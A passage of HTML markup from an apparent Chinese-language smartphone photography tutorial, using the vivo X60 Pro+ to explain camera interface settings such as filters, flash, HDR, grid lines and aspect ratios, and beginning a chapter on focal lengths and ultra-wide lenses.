data-original=\"https://pic2.zhimg.com/v2-04abfcb5f87603e042c026ee35b62b05_r.jpg\"></figure><h3>拍摄模式区</h3>\n<p>在这一部分我们可以针对性地选择不同拍摄形式，比如最常见的就是「照片」，其次是「录像」，也就是视频功能。</p>\n<p>而拍摄模式也是我们每一次拍摄最先做的一个决定。当你看到一个场景时，我们潜意识最先要进行的一个判断就是我是想要拍一张照片还是拍一段视频。</p>\n<p>当然也可以是更为细致的类型，比如我是想要拍摄大光圈的人像效果选择人像模式，还是要拍摄弱光下的夜景效果选择夜景模式。总之，这都是我们在打开相机之前就要做好的选择。</p>\n<p>并且选择一个拍摄模式以后，相机界面的各项设置都会针对性跟随更改。考虑到各拍摄模式需要整体知识学习后才能讲解，所以下面其它区域的讲解部分只先从「拍照」模式开始。</p>\n<h3>镜头选择区</h3>\n<p>随着手机摄影的发展，多镜头几乎已经成为每一个主打摄影手机的标配。所以这一个区域就是可以让我们用来选择不同焦距的镜头。可不要小看这一部分，不同镜头有着完全不同的拍摄效果，对于画面有着决定性的作用。所以我们后面甚至会有一个针对性的章节来叙述，这里我们先按下不表，你只要知道这里可以进行不同的镜头切换即可。</p>\n<p>在镜头区域切换一侧的是针对性的效果设置，根据拍摄模式不同也略有差异。不过总得来说，主要包含美颜效果、色彩滤镜、镜头虚化能力等等。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-bc93e6e9bea3699c5b9de13925e0b044_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic1.zhimg.com/v2-bc93e6e9bea3699c5b9de13925e0b044_r.jpg\"></figure><p>所谓的滤镜，代表的是画面中的色彩。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f3fa86a81b69aa097a92c01612919ccd_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-f3fa86a81b69aa097a92c01612919ccd_r.jpg\"><figcaption>使用「肖全滤镜」拍摄</figcaption></figure><p>对于今天的手机用户来说，色彩滤镜可以说是再熟悉不过了。这几乎成为手机最为主流的后期方式。但是现在你也可以把这种后期方式进行前置。先选好自己喜欢的滤镜，再进行拍摄。当然我知道，你可能会说，后期配不是更加自由。但是如果前期可以配滤镜，有两个好处：</p>\n<ol>\n<li>选择择对应的滤镜以后，手机的取景画面也会针对性的改为对应的滤镜颜色，这会极大的提高你的拍摄欲望。你会发现很多平平无奇的场景，可能就是因为滤镜的出现好看起来，让你捕捉到更多意想不到的画面。</li>\n<li>安卓手机的滤镜系统有些不能后期追加。比如在 vivo X60 Pro+ 中，有两个我非常喜欢的滤镜，一个是肖全的黑白滤镜，一个刘雯的彩色滤镜。这两个滤镜都有着非常迷人的影调和色彩风格，但是只有在前期拍摄以后才能选择，不能在现有的照片上添加。我猜测，可能是类似这样的滤镜，为了更好的拍摄效果，镜头的研发工程师们不是在画面上套滤镜，而是在画面中数字转为图像的过程中直接控制色彩风格。这样的好处就是，结果更加真实自然，色彩更加扎实，不虚假。</li>\n</ol>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3bf8a712db6c6a36cdf3ec32b153d204_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-3bf8a712db6c6a36cdf3ec32b153d204_r.jpg\"><figcaption>使用「法式印象」拍摄</figcaption></figure><p>尤其是，大家可以试着打开自己手机里有趣的黑白滤镜，比如 vivo X60 Pro+ 的黑白滤镜进行取景试试，您会发现一个截然不同的黑白世界。</p>\n<p>所谓的光效，是代表画面中的光影之感。</p>\n<p>这一调整主要是针对人像摄影中，人物面部的光影效果。在以前人像中的肖像摄影，摄影师需要使用闪光灯布置拍摄，来营造人物面部的不同光影效果。但是现在手机的算力越来越好，手机开始模拟类似的光影效果。比如 vivo X60 Pro+ 中就包含了不同的拍摄人像光线效果：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-86093375d4d6eb43e83f76665e318e28_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"581\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-86093375d4d6eb43e83f76665e318e28_r.jpg\"></figure><h3>取景框</h3>\n<p>用于画面的实时预览。虽然这里没有任何功能设置，但还是要说一句题外话。安卓手机和 iPhone 一个明显的不同就是取景是否可以所见即所得。iPhone 几乎没有任何差异，过去几年里安卓则差异巨大，尤其是很多手机品牌为了优化，甚至会出现截然不同的结果。</p>\n<p>如果你真的很喜欢手机摄影，那我建议你远离类似的手机。其实这也是我自己很喜欢 vivo X60 Pro+ 的一个原因，它的取景画面和拍摄画面基本上没有太多差异。这对我拍摄构思起到了重要帮助。</p>\n<h3>功能设置区</h3>\n<p>这片区域主要针对每个拍摄模式的针对性设置，它会跟随拍摄模式而变化。</p>\n<p><b>闪光灯</b></p>\n<p>其实我一直认为闪光灯是很多人忽视的「宝藏功能」。</p>\n<p>首先，闪光灯的基本功能是<b>为了画面中光线不足时，主动进行补充。</b></p>\n<p>比如下面画面中的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-78eb3a13806f64ba39b2ec913cfa7202_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-78eb3a13806f64ba39b2ec913cfa7202_r.jpg\"><figcaption>关闭闪光灯拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0ec4599637b99dc6a7a2f30ecc9551cf_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-0ec4599637b99dc6a7a2f30ecc9551cf_r.jpg\"><figcaption>开启闪光灯拍摄</figcaption></figure><p>但随着后来闪光灯在小型相机上的普及，逐渐演绎出了一种非常独特的摄影风格。尤其是日系写真摄影师们，经常会在人像或者是生活拍摄中使用闪光灯直接拍摄。无论是我们熟知的森山大道还是荒木经惟都有着类似的拍摄使用。</p>\n<p>所以如果你对于自己的拍摄陷入了一种瓶颈，我特别建议你可以试试开启闪光进行拍摄。而且需要注意的是，并不是一定是暗光的夜晚才能使用闪光，也不是只有人像才能使用闪光，而是只要是你想要给自己的作品中增添一种「光感」，都可以进行尝试。</p>\n<p>比如下面的照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1b16d9c0a4c570fb483719ba563349a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-1b16d9c0a4c570fb483719ba563349a8_r.jpg\"></figure><p>一个很重要的经验就是，相机中的闪光灯默认的曝光倾向都是为了使面中的主体更亮，所以都会有着一定的过度曝光的倾向。所以为了能够让你的拍摄成功率更好，使用闪光灯时一定要主动的降低画面的曝光。</p>\n<p>直接闪光对于拍摄一些柔和的少女人像可能不太友好。这里也有一个很重要的技巧，就是学会柔光。比如我们可以在闪光灯前罩上一些半透明的介质，甚至是白色的纸巾都可以。这样你会发现补充的光线会自然柔和一些。</p>\n<p>如果说你是一个新手，还是不能很好的驾驭闪光灯，这里的闪光的还有一个很重要的妙用，也就是直接补光。以前在介绍 iPhone 摄影时，这里我需要让大家打开手机的手电筒，这样才能让闪光灯持续点亮，为画面补充光线。弊端是它这需要两台手机的配合，一台补光，一个拍摄。</p>\n<p>但是在 vivo X60 Pro+ 中竟然直接提供了一个补光选项，可以直接常亮，非常贴心。不过如果你的手机没有这个选项，就需要像 iPhone 一样，可以打开手电筒进行补光。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-e45f02efbef994bc2558debf9c5bee4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-e45f02efbef994bc2558debf9c5bee4d_r.jpg\"></figure><p><b>HDR 功能</b></p>\n<p>HDR 功能，基本上是如今智能手机的看家本领。很多人在一些场景中会发现几万块的相机拍摄效果甚至是没有几千块的手机效果好，一个重要的因素就是今天手机的智能 HDR 真的实在是太优秀了。</p>\n<p>比如在下面的场景中，我们看到如果我们不开启 HDR ，画面中天空的场景是过曝的，这是因为室内外光线差别太大，相机的宽容度不够，我们只能照顾亮部或者是暗部的其中一个。</p>\n<p>想要暗部清晰，那么亮部就会过曝。</p>\n<p>想要亮部清晰，那么暗部就会死黑。</p>\n<p>而开启 HDR 以后，正如下图所见：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c1d62442be9d5efe95760c93a9092c4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-c1d62442be9d5efe95760c93a9092c4d_r.jpg\"></figure><p>暗部有细节，亮部很清晰。</p>\n<p>这还不是今天的手机摄影 HDR 的全部本领，很多手机现在甚至是可以针对画面中的景物 HDR。结论就是：</p>\n<p><b>放心打开使用，不需要关闭。</b></p>\n<p>曝光知识远不止这些，我会在后面的章节中详细阐述。</p>\n<p><b>AI 场景优化</b></p>\n<p>先说结论，我自己是拿到手机的第一刻就会关闭安卓手机上所有所谓的「AI」优化功能。这其中的原因不完全是因为我不信任 AI，恰恰相反，今天的手机 AI 非常聪明，绝大多数情况下都会有很好的效果。而我之所以关闭是因为：</p>\n<p>「我希望拍摄我想要的画面，而不是机器想要的大数据画面。」</p>\n<p>通过前面的审美章节的阐述相信你也知道了，审美是一个很私人的事情。但是所谓的 AI 美化，则是基于大多数人的喜好统计，它并不能代表你的独特审美。的确，大多数人拍摄花朵时，希望花朵更加颜色艳丽，但我可能喜欢花朵更加深沉。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5dbbe5203e2eedc70c04d1f7ce5d021d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-5dbbe5203e2eedc70c04d1f7ce5d021d_r.jpg\"></figure><p>所以，如果你学习这篇文章的目的是更好的摄影表达，就应该关掉 AI。</p>\n<p>但我也知道，很多人的手机摄影只是为了社交网络服务，自己不想花时间后期或者是创作，那么 AI 相当于一个智能管家，帮你直接在拍摄之后做成大家喜欢的样子。</p>\n<p>萝卜青菜，任君选择。</p>\n<p><b>微距开关</b></p>\n<p>首先需要说明的是，不同安卓手机的微距能力是不同的，因此微距效果也不相同。微距镜头其实和普通镜头在设计上有差别。本文举例的 vivo X60 Pro+ 因此给设定了一开关，通过这个按钮可以直接改变镜头的物理特性，从而获得完全不同的最小对焦距离，获得完全不同的微距效果。</p>\n<p>微距拍摄其实是一个非常有趣的领域。对于摄影作品，甚至是广泛意义上的艺术作品来说，陌生感是很重要的艺术特性。而微距摄影之所以独特，就是因为微距摄影给了我们完全不同的观察角度。就算是一片非常普通的树叶，在微距镜头之下也会展现出不一样的精彩。所以我经常会使用微距镜头到处拍拍，你会发现很多看似平平无奇的景物有着完全不同的观感。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ba46b855dc17381ddde8fc3288678a5c_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-ba46b855dc17381ddde8fc3288678a5c_r.jpg\"><figcaption>使用微距模式拍摄</figcaption></figure><p>点按三条横线以后，我们就会进入二级菜单，在这里有四个选项：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bb9fd4dec47dd5e5d62d3c1360487fa2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-bb9fd4dec47dd5e5d62d3c1360487fa2_r.jpg\"></figure><p><b>网格线</b></p>\n<p><b>请你一定要打开网格线，它非常重要。</b>它既是一种你认真对待摄影的态度，也对你的拍摄过程起着重要的帮助，尤其是后面的构图章节。</p>\n<p>而且抛开所谓的进阶构图不谈，这网格线也至少可以让你在拍摄时横平竖直，尤其是一些建筑摄影，绝对是省力且高效。因此，如果你的手机现在没有打开网格线，那么现在请你立刻马上打开手机的网格线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9763abac88d39c65e0b982ae8c15ea39_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"581\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-9763abac88d39c65e0b982ae8c15ea39_r.jpg\"></figure><p><b>倒计时</b></p>\n<p>本身这项功能的出发点是方便一些合影中，拍摄人员可以有时间进入队伍，所以预留了一段时间来触发快门。但是毕竟这种情况相对来说比较少数，所以这项功能很少有人使用。但是这项功能还有一个非常重要的妙用，这就是：</p>\n<p><b>快门线。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d105f383dc95e744edd3c20b6dab361f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic4.zhimg.com/v2-d105f383dc95e744edd3c20b6dab361f_r.jpg\"></figure><p>在后面的章节中，我们会学习到长曝光的技法，一个重要的案例就是星空拍摄。长曝光的一个重要诀窍就是保持相机稳定，但是手机快门是需要点按屏幕，因此即使使用了稳定设备比如三脚架，还是很容易造成机身晃动。因此我们可以设定 3 秒的延时快门，这样按下快门以后，3 秒钟再触发快门，手机就会恢复稳定。</p>\n<p><b>画幅选择</b></p>\n<p>所谓的画幅，就是照片比例。</p>\n<p>其实画幅的选择是跟构图相关联的，因为不同的画幅完全有着不同的构图逻辑。在 vivo X60 Pro+ 中一共提供了 4 种画幅。</p>\n<p><b>1. 4:3 画幅</b></p>\n<p>这是最为常见的照片画幅比例，几乎所有的手机都是统一使用这个比例。</p>\n<p>这个画幅最大的拍摄感受就是画面最为工整，画面有着明确的延伸方向。所以大多数情况，我建议你使用 4:3 的拍摄比例。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-23e2507f9b64c0fd7e41dea85476b2a3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-23e2507f9b64c0fd7e41dea85476b2a3_r.jpg\"></figure><p>而且需要注意的是，绝大多数情况下手机的传感器比例也是 4:3 ，也就是说如果你使用 4:3 的比例进行拍摄，就会充分利用画面中的每一个像素点。而其它的画幅比例，都是在 4:3 的基础上进行裁切，因此都会有着一定的像素损失。所以这也意味着你可以在前期使用 4:3 ，通过后期裁切为其它的任意比例。</p>\n<p><b>2. 全屏画幅</b></p>\n<p>其实这个选项并不是从摄影创作的角度出发的，而是手机屏幕发展的附属产物。因为在过去的某一段时间里，手机进入了全面屏竞赛的阶段，很多厂商为了展现全面屏的优势，提供了整个屏幕取景的方式。我自己非常不喜欢这种取景方式，一方面画面中有很多 UI 遮挡，即使是半透明的，也很影响画面内容的获取。而且另一方面，这会放大手机曲面屏边界不清晰的缺陷，很不利于构图。</p>\n<p>所以我的建议是，永远不要使用。</p>\n<p><b>3. 16:9 画幅</b></p>\n<p>16:9 的比例是视频拍摄的经典比例，所以当你使用 16:9 拍摄照片时，也会获得一种非常独特的电影质感。如果你长时间关注手机摄影的趋势，就应该还会记得，曾经某一段时间流行一个专门的软件，可以帮你照片裁切成 16:9 的同时加一句台词来装作电影截图，风靡一时。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8722dc2313001801611a0ab3ce49966e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"719\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-8722dc2313001801611a0ab3ce49966e_r.jpg\"></figure><p>但需要承认的是，16:9 其实本身是需要一定驾驭能力的，所以初学者建议不要尝试，也不要过度迷恋所谓的「电影感」。</p>\n<p><b> 4. 方形画幅</b></p>\n<p>我个人是十分喜欢正方形画幅的，而且我也特别推荐入门新手使用正方形构图，因为它「相对简单」。都说摄影是减法的艺术，所以一个简单的简化方式就是「减轻布局的压力」。当我们使用正方形构图时，我们可以很自然的把主体放到画面中间，而不需要考虑主体以外的内容。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-28165baeff85155fb6ad81e7978db1b0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"1280\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-28165baeff85155fb6ad81e7978db1b0_r.jpg\"></figure><p>而且正方形也更适合今天的社交网络，比如最为经典的 Instagram 就是著名的正方形图片社交网络。这也影响了几乎今天所有的图片社交网络。比如我们的微博、微信的图片方格都是正方形。所以如果你使用正方形构图拍摄就意味不会有画面的信息流失。</p>\n<h3>基本设置区</h3>\n<p>在这个区域中，所有的调整是针对整个相机的。而且基本上，只要针对性地设置一次，每次拍摄并不需要单独调整。需要说明的是，不同机型差别较大，但大部分选项重叠，只不过有机型的针对性功能。比如微云态校准，就是 vivo X60 Pro 系列专属。</p>\n<p>所以这里我直接着重说一些通用的设置：</p>\n<p><b>快门声音</b></p>\n<p>很多人认为快门声音的设置是多此一举的，但是实际上，在我看来快门声音可以关闭非常重要。的确，大多数情况下拍摄时配合着快门声音是一种快感。而且我也的确承认，好听的快门声可以满足创作的仪式感。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-febd580d22a6c37e2290449ca69ef10c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-febd580d22a6c37e2290449ca69ef10c_r.jpg\"></figure><p>但是创作是分类别的，如果你的创作需要不打扰，尤其是一些本身环境安静的场所拍摄，那么就一定要关闭快门声音。</p>\n<p>比如当我要进入一些寺庙时，我是一定会关闭快门声音的。但更重要的是，在一些题材的拍摄中，我们仅仅是一种观察者，如果快门声存在反而打破了这种平衡。被拍摄者可能因为快门声音，失去原有的状态。这一点在人文摄影中之至关重要，只要你消失在「无声之中」，他们才会呈现出最自然的状态。</p>\n<p>比如下面这张照片，就是我关掉快门声音，悄悄地坐在主体的身旁拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-be91ad3cd0b9550596e822393349801d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-be91ad3cd0b9550596e822393349801d_r.jpg\"></figure><p><b>水印</b></p>\n<p>不要在前期拍摄时打开水印。</p>\n<p>我不知道在拍摄的照片中添加水印，是哪一个厂商带起来的，但这绝对是「本末倒置」的行为。很多人认为增加水印会让自己的照片更加高级，我觉得很可笑。因为如果你的照片需要一个水印来提升「所谓的逼格」，那就偏离了你学习摄影的本质。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2d5492b6ad2bd26f775487b877e26418_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-2d5492b6ad2bd26f775487b877e26418_r.jpg\"></figure><p>况且，前期添加水印还会给你带来技术上的麻烦。因为你会发现，水印的出现就意味着你的作品不能自如地进行二次后期构图。</p>\n<p>因为你需要照顾水印在画面中的比重。而二次构图对于摄影后期来说，可以说是决定性的一环。不仅是构图，调色也是一个要素。手机调色全局调整，也会让水印的颜色发生改变，让画面十分违和。</p>\n<p><b>所以，关掉任何形式的水印。</b></p>\n<p>如果你真的有需要增加水印，也还请后期添加，而不是在拍摄前期添加。</p>\n<p><b>快门触发方式</b></p>\n<p>快门的触发方式一直是我自己的一个「小趣味点」。</p>\n<p>这也是安卓手机一些独特的乐趣。比如 vivo X60 Pro+ 就提供了触屏、语音、手掌等多种拍摄方式。这些拍摄方式本质上是用来解放你的双手进行拍摄。显然，最合适的场景依然是多人的合影，只要架起来就不需要另一个人进行主动拍摄。</p>\n<p>但其实，这些快门的触发方式还有一个非常有用的用法这就是：</p>\n<p><b>更加优雅的自拍。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d14a8fd3145ddca291a5c0f44ef09b19_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-d14a8fd3145ddca291a5c0f44ef09b19_r.jpg\"></figure><p>很多人提到自拍可能会固化地认为某一种类型的，但是广泛的自拍其实也包含对自己的探索。这方面很多画家走在前面，比如说许多画家的自画像，例如梵高。摄影的初期也有类似的案例，比如爱德华·韦斯顿的自拍。因此我们也可以拍摄一些表达自己风格的自拍，这个时候通过「语音快门」就可以实现自行拍摄，并且还不会限制自己在画面中的全身动作。</p>\n<p>如果你读到这里，某种意义上已经完成了一种「热身」。因为这些功能介绍和设置，本质上的确是一种准备工作。但更重要的是，这些功能不是关键，而是辅助。</p>\n<p>真正的核心，咱们现在开始。</p>\n<h2>03. 镜头中的镜头眼</h2>\n<p>这部分内容的表层是：</p>\n<p>掌握不同镜头焦距的拍摄使用。</p>\n<p>但里层是：</p>\n<p>用不同的视角构建画面。</p>\n<p>我们都知道任何一部相机都离不开镜头，而镜头作为相机的「眼睛」，对画面的内容效果起着决定性作用。而这一章节中，我们要学习的就是镜头的一个重要参数：</p>\n<p><b>焦距。</b></p>\n<p>就算你不是专业的摄影师，你也可能或多或少的听说过这个词。而它的具体含义是镜头的光学中心点和传感器的距离。</p>\n<p>听不懂？没关系，你完全不需要听懂，你只要用视觉感受即可。比如下面是一组图，这四张图是使用 vivo X60 Pro+ 上四颗不同焦距的镜头拍摄。你会发现同一主体，四颗镜头就是完全四种不同的感受。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5b371369d3a435066e0463db23a3618d_b.jpg\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-5b371369d3a435066e0463db23a3618d_r.jpg\"><figcaption>超广角镜头（0.6X/等效 14mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ec327dab085b356e4c66ad37f6157d8f_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-ec327dab085b356e4c66ad37f6157d8f_r.jpg\"><figcaption>广角镜头（1X/等效 23mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6b50840ffb22b532143e170ad847528_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-a6b50840ffb22b532143e170ad847528_r.jpg\"><figcaption>标准镜头（2X/等效 50mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e6e2c6e5e5fbeb4fe6f9c667567f6092_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-e6e2c6e5e5fbeb4fe6f9c667567f6092_r.jpg\"><figcaption>长焦镜头（5X/等效 125mm）</figcaption></figure><p>焦距有一个衡量数值，一般都是 「mm」 为单位。但是需要说明的是，不同传感器面积的大小，计算方式不同，所以为了统一，摄影师们就有了一个<b>「等效焦距」</b>的概念。</p>\n<p>不同等效焦距的不同效果，我们可以使用下面这张图一目了然的获得，我们会发现：</p>\n<p>焦距越小，画面越广，拍摄得越近。</p>\n<p>焦距越大，画面越窄，拍摄得越远。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b9da7f8bb8f47c6173e5cd6f9f622bae_b.jpg\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"470\" class=\"origin_image zh-lightbox-thumb\" width=\"698\" data-original=\"https://pic3.zhimg.com/v2-b9da7f8bb8f47c6173e5cd6f9f622bae_r.jpg\"><figcaption>图片来自 Nikon USA © Dave Black</figcaption></figure><p>不过今天的手机镜头并不会直接标注焦距，而是直接用 0.6X、 1X、2X、5X 来展现焦距的变化。但其实每一个倍数都有一个焦距对应，不过不同机型略有不同。而本文举例的 vivo X60 Pro+ 分别对应为：</p>\n<p>14mm、23mm、50mm、125mm。</p>\n<p>需要说明的是，镜头的焦距也分为可变和不可变两种，所以也就有了定焦镜头和变焦镜头。目前来说，几乎所有的主流影像旗舰手机都是搭配「多颗定焦镜头」。这主要是因为变焦镜头必须需要一定的物理空间，在手机的空间中很难实现。</p>\n<p>不过你可能会发现，智能手机在使用时是可以放大缩小变焦的，这其实是一种「障眼法」。目前多镜头手机的变焦都是通过「数字裁切实现」。比如 vivo X60 Pro+ 拍摄的画面如果是等效 20mm 左右大小，那它的画面实际上是 14mm 的画面裁切而成。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-97e600571a2a4a74ed995559e87d90f0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-97e600571a2a4a74ed995559e87d90f0_r.jpg\"></figure><p>这是一个很重要的知识点，因为这解释了你在拍摄时放大画面按常规来说画质会下降，可有的时候画质却突然变好。这是因为此时镜头已经过渡到了另一颗镜头上，而不是较低焦距镜头数值的裁切。这告诉我们一个重要的经验：</p>\n<p>想要最好的画质，就不要粗暴的使用放大缩小的拖动变焦，而是直接点击画面中不同的镜头，直接切换定焦距。就算你想要放大，后期的裁切和手机内部的裁切别无二致，自己后期裁切还能更加自由。</p>\n<p>不过焦距对于画面的影响远不住如此，我们一个一个来。</p>\n<p>依然需要说明，这里使用 vivo X60 Pro+ 作为案例，其它手机可能略有差异。</p>\n<h3>超广角镜头（0.6X/等效焦距 14mm）</h3>\n<p>坦率地说，作为一个专业摄影师，我自己都很难说我可以驾驭超广角，尤其是 14mm 这么广的超广角。这也从另一个侧面说明了今天智能机厂商摄影竞赛的白热化，因为提供的影像规格已经开始溢出。</p>\n<p>不过虽然说使用超广角很难，但是当你真的能够熟练使用超广角镜头时，你会像驯服一匹野马，很有成就感和乐趣。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d4ae4e48f279361942682d99d07baf57_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-d4ae4e48f279361942682d99d07baf57_r.jpg\"></figure><p>很多人其实存在一个误区，认为超广角的奥义在于「广」，也就是画面中拍摄的内容更多。但实际上，摄影师看中超广角的是：</p>\n<p>夸张的透视。</p>\n<p>比如上面超广角的图，我们会发现一个很重要的规律，这就是空间感强烈。在超广角的镜头下画面中的「近大远小」特性会非常明显。而这种非常强烈的近大远小的特性，绝对是一种少见的陌生感。所以这也是为什么如果我们使用超广角拍摄，很容易被叫做「大片」的原因。</p>\n<p>这也是一个很值得探讨的话题，比如说为什么很多照片看起来有艺术感或者是大片感。其中一个很重要的要素就是「不同」，甚至是「怪异的不同」。这些超常规的视觉，会让我们和照片本身突然有了距离感，也正是这个距离产生了美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-098a25b43b2cb11053e4ade9fb89ed47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-098a25b43b2cb11053e4ade9fb89ed47_r.jpg\"></figure><p>说远了，说回超广角。超广角镜头另一个重要的特性就是越是靠近画面的边缘越会拉伸，越靠近画面中心越会压缩。听到拉伸和压缩，就要敲黑板了。因为这在人像中，直接影响了身高。</p>\n<p>比如下面这张图，我们会发现姑娘的腿非常的长，就是因为腿在画面边缘，而身体和头在画面中央。相信我，学会了这一招，每个人都是九头身美女。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-60ebea40daf8dd84eb2f79333ea2e9e2_b.jpg\" 